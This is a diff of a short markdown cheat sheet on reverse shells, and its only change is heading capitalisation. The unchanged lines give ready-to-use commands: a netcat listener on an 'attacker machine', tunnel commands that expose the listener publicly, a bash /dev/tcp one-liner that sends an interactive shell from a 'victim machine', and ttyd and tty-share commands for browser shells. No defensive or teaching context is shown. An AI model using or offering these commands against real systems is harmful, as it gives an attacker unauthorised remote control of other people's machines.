@@ -1,10 +1,10 @@
-# terminal reverse shell
+# Terminal Reverse Shell
 
-## open listener port on attackers machine
+## Open Listener Port on Attacker Machine
 * `nc -v -lp 3000`
 * macOS `nc -v -l 3000`
 
-#### optional - get public address by creating a tcp reverse tunnel
+### Optional: Get Public Address via TCP Reverse Tunnel
 
 - pinggy.io 
   - https `ssh     free.pinggy.io -p 443 -R0:localhost:<local-port> `
@@ -12,7 +12,7 @@
 
 - cloudflare `cloudflared tunnel --url tcp://localhost:3000`
 
-## reverse connect from victim machine to attackers machine
+## Reverse Connect from Victim Machine to Attacker Machine
 ### bash
 
 * nc
@@ -23,9 +23,9 @@
 * bash
   `/bin/bash -c '/bin/bash -i >& /dev/tcp/${0/://} 0>&1' localhost:8000`
 
-# browser reverse shell - ttyd
+# Browser Reverse Shell - ttyd
 `docker run --rm -p 8080:7681 tsl0922/ttyd`
 `ssh -R 80:localhost:8080 nokey@localhost.run`
 
-# browser reverse shell - tty-share
+# Browser Reverse Shell - tty-share
 `docker run --rm -it elisescu/tty-share --public`
